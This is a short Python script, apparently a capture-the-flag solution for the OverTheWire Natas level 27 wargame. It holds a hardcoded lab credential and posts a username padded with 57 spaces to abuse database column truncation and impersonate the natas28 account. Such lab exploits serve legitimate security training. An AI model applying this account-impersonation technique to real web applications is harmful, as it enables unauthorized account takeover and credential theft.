import requests
from requests.auth import HTTPBasicAuth

url = "http://natas27.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas27", "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth)
sessionID = session.cookies.get("PHPSESSID")
print(f"Session ID: {sessionID}")


payload = {"username": "natas28" + 57 * " " + "a", "password": "123"}


response = session.post(url, auth=auth, data=payload)
print(response.text)
response = session.post(url, auth=auth, data={"username": "natas28" + 57 * " ", "password": "123"})
print(response.text)
